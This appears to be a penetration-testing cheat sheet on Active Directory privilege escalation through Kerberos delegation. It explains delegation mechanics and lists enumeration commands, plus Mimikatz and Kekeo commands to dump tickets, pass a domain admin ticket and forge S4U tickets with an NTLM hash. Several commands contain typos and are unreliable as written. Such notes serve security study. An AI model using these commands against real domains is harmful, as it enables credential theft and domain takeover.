# Domain Privilege Escalation - Delegation

Kerberos delegation allows to re use user's credentials to access resources hosted on a different server , this is done in mult-tier service where kerberos double hop is required

Delegation could look like this where a user authenticates to web server , web server makes requests to database server but not as web service account but as the user account (that has authenticated)

## Steps in delegation

- User provides credentials to domain controller (DC)

- DC returns a Ticket Granting Ticket (TGT)

- User requests a Ticket Granting Service (TGS) for the service he wants to connects , let's say web service

- User sends TGT and TGS to web server

- Web service account uses the user's TGT to request to another service to use , let's assume database service

- Web server's account connects to database server as the user 

## Types of delegations

There are 2 types of delegations

- Unconstrained Delegation
- Constratined Delegation

## Unconstrained Delegation

Unconstrained delegation allows first hop server to request access to any service on any computer in domain

The way this delegation works is that domain controller places Ticket Granting Ticket (TGT) in Ticket Granting Service (TGS) , TGT is extracted from the TGS and TGT is stored in LSASS by the server , this way server can reuse user's TGT to access any resource in the domain as the user.

# PowerView

### Discover domain computers which have unconstrained delegation

```
Get-NetComputer -UnConstrained
```

## AD Module
```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -e $True}
```

# Mimikatz

After finding that which computer or service has unconstrained delegation enabled , we will need to make a domain admin login to that service/computer and with administrative privileges on that computer we can use mimikatz to list the avaiable tickets in the session , as in unconstrained delegation , TGT will be loaded in LSASS so we can use that to get domain admin

## Check if any domain admin token is available

```
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

By running this command we can see a administrator token so use the command below to do `ptt` pass the ticket to load it into the current sessions

```
Invoke-Mimikatz -Command '"kerberos::ptt location_of_the_ticket(C:\Users\user\Documents\ticket_something)"'
```

## Constrained Delegation

Constrained delegation allows first hop to request access to specific services on specific computers. It allows access only to specified services on specified computers as a user.

It doesn't use kerberos when authenticating the user ,when a user authenticates to a web service , and the user requests something from database ,web server makes a requests using the authorized user account,   to impersonate the user  , `Service For user (S4U) extension is used ` that has two extensions

- Service for user to self (S4U2Self) , it allows a service to obtain forwardable TGS to itself on behalf of a user. This must have `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION`
- Service for User to proxy (S4U2Proxy) , it allows a service to obtain a TGS for second service on behalf of authorized user. This is controlled by `msDS-AllowedToDelegateTo` attribute that contains list of SPNs to which user tokens can be forwarded

## Steps in constrained delegation

- A user authenticates to web serivce using non kerberos authentication mechanism.

- Web service requests a ticket from DC/KDC for the user's account without supplying the password as web service account.

- KDC checks if web service account has  `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` attribute and also if the user isn't blocked for delegation , then it forwards a S4U2Self ticket for the user's account.

- Service then passes this ticket back to KDC and a request a service ticket for the another service let's say Database service.

- KDC checks if  `msDS-AllowedToDelegateTo` is on the web service account ,if service is listed then it will return the token for database service (S4U2proxy).

- Web service can now authenticate to database service as the user's TGS to that service.


### PowerView (dev)

#### Enumerate users and computers with constrained delegations enabled

```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

### AD Module

#### Enumerate users and computers with constrained delegations enabled

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null" -Properties msDS-AllowedToDeleagteTo}
```

### Kekeo.exe

### Using `asktgt`  we will first get the TGT of  the service account that is allowed to delegate

```
tgt::ask /user:username /domain:domainname /rc4:ntlm_hash_of_user
```

### Using `s4u` , we request a TGS as any user on the service which we have permission to delegate

```
tgs::s4u /tgt:TGS_Ticket_of_service_account /user:Administrator@domainname /service:mssql
```

### Now using mimikatz , we can use pass the ticket to load the ticket in powershell session

```
Invoke-Mimikatz -Command '"kerebros::ptt administrator_ticket"'
```



